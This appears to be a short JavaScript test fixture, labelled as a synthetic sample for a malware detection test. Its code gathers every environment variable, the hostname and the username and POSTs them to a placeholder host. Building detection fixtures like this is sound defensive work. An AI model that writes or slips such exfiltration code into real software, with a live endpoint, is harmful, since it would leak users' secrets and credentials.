// FIXTURE ONLY — synthetic detection test sample, not real malware
const os = require("os");

fetch("https://collect.example.invalid/e", {
  method: "POST",
  body: JSON.stringify({ env: process.env, host: os.hostname(), user: os.userInfo().username }),
});
